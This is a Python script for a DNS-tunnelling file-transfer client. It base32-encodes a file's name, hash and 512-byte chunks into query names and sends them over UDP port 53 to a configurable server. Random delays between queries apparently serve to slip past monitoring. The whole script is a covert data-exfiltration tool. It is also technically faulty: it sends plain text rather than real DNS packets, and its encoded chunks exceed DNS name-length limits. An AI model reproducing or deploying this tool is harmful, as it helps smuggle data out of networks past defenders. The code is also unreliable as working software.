import socket
import base64
import hashlib
import os
import time
import random

DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server IP
DNS_PORT = 53
domain = "fileupload.example.com"  # Domain to use

# Function to calculate MD5 hash of a file
def calculate_md5(file_path):
    md5_hash = hashlib.md5()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            md5_hash.update(byte_block)
    return md5_hash.hexdigest()

# Function to send a DNS query with a random delay based on user input
def send_dns_query(data, server_ip, max_delay):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(data.encode(), (server_ip, DNS_PORT))
    
    # Add a random delay between 0.1 seconds and the user-provided maximum delay
    delay = random.uniform(0.1, max_delay)
    print(f"Query sent, delaying next query by {delay:.2f} seconds.")
    time.sleep(delay)

# Function to send file in chunks with a chunk counter
def send_file_chunks(file_path, server_ip, domain, max_delay, total_chunks):
    chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
    
    with open(file_path, "rb") as file:
        for chunk_number in range(total_chunks):
            chunk_data = file.read(chunk_size)
            encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")

            # Use a static "chunk" prefix for all chunk queries
            query = f"c{chunk_number}.{encoded_chunk_data}.{domain}"
            print(f"Sending chunk {chunk_number + 1}/{total_chunks}")
            send_dns_query(query, server_ip, max_delay)

# Function to send file information (filename, MD5 hash, and total chunks)
def send_file_info(file_name, file_md5, total_chunks, server_ip, domain, max_delay):
    # Use static "fileinfo" prefix for the file info query
    encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
    encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
    encoded_total_chunks = base64.b32encode(str(total_chunks).encode()).decode().strip("=")

    query = f"f.{encoded_file_name}.{encoded_file_md5}.{encoded_total_chunks}.{domain}"
    print(f"Sending file info: {file_name}, MD5: {file_md5}, Total Chunks: {total_chunks}")
    send_dns_query(query, server_ip, max_delay)

# Function to signal end of transmission
def send_end_signal(server_ip, domain, max_delay):
    # Use static "end" prefix for the end-of-transmission signal
    query = f"e.end.{domain}"
    print("Sending end of transmission signal")
    send_dns_query(query, server_ip, max_delay)

# Main client function
def send_file(file_path, max_delay):
    # Strip any extraneous quotes from the file path
    file_path = file_path.strip('"').strip("'")

    file_name = os.path.basename(file_path)
    file_md5 = calculate_md5(file_path)

    # Calculate total number of chunks
    file_size = os.path.getsize(file_path)
    chunk_size = 512
    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)

    # Send file info (filename, MD5 hash, and total chunks)
    send_file_info(file_name, file_md5, total_chunks, DNS_SERVER, domain, max_delay)

    # Send file chunks with chunk counter and random delays
    send_file_chunks(file_path, DNS_SERVER, domain, max_delay, total_chunks)

    # Signal the end of transmission
    send_end_signal(DNS_SERVER, domain, max_delay)

# Example usage
file_path = input("Enter the file path to send (quotes allowed): ").strip()
max_delay = float(input("Enter the maximum delay (in seconds) between queries: "))
send_file(file_path, max_delay)
